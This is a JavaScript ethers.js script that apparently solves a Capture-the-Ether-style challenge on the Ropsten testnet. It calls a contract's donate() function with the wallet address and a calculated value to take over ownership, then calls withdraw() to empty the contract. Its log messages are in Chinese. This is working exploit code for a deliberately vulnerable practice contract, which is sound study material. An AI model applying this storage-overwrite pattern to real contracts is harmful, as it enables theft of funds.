import {Contract, ethers, utils} from 'ethers';
import { INFURA_ROPSTEN_URL, privateKey, mnemonic } from '../constant.js';

const provider = new ethers.providers.JsonRpcProvider(INFURA_ROPSTEN_URL)
const wallet = new ethers.Wallet(privateKey, provider)
// const wallet = new ethers.Wallet.fromMnemonic(mnemonic).connect(provider)


const contractaddr = "0xa290126f3A6389b9F92424F5D351ee34eA1D4220";
const contractabi = [
    "function donate(uint256 etherAmount) public payable",
    "function isComplete() public view returns (bool) ",
    "function withdraw() public"
]
const contract = new ethers.Contract(contractaddr, contractabi, wallet);

const main = async() =>{

    const a = await wallet.getAddress();
    // console.log("地址为：：：：", a);
    const addr = ethers.BigNumber.from(a);

    const ethnumb = ethers.utils.parseEther("1");
    const ethu = ethnumb.mul(ethnumb);
    const msgvalue = addr.div(ethu);
    // console.log("@@@@@@@", msgvalue);

    const options = {
        value: msgvalue,
        gasLimit: 100000
    }


    let tx = await contract.donate(addr, options);

    await tx.wait();
    console.log("成功获取权限， 开始转账！");


    let tx2 = await contract.withdraw({gasLimit: 100000});
    await tx2.wait();
    console.log(tx2);

    





    console.log("结果为",await contract.isComplete());

    console.log("程序运行结束！！！！！！");

}
main();

